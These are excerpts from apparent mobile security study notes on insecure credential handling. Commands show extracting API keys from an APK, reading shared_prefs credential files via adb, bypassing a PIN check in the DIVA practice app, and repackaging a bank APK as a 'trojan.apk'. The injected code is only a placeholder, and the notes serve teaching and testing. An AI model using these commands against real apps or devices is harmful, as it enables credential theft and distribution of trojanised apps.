...
> ***Definition:* Improper handling of credentials (passwords, API keys, tokens) in mobile applications, making them easy to extract or misuse.**

**Examples:**

- **Hardcoded Credentials in APK:**

> `strings app.apk | grep "API_KEY"`
...
> `adb shell cat /data/data/app.name/shared_prefs/auth_prefs.xml`
...
> `steps: - name: Inject malware`

> `run: echo 'malware_code' >> app/src/main/java/MainActivity.java`
...
> `apktool d bank.apk -o modified_bank`

> `echo 'malicious code' >> modified_bank/smali/com/bank/Login.smali`

> `apktool b modified_bank -o trojan.apk`
...
```
adb shell am start -n jjj.ass.diva/.APICreds2Activity -a jjj.ass.diva.action/.VIEW_CREDS2 -ez check_pin false
```
...
```
adb shell run-as com.example.app cat /data/data/com.example.app/shared_prefs/user.xml
```
...
apktool b extracted_apk -o modified.apk
```
...
```
cd /data/data/app.name/shared_prefs
```
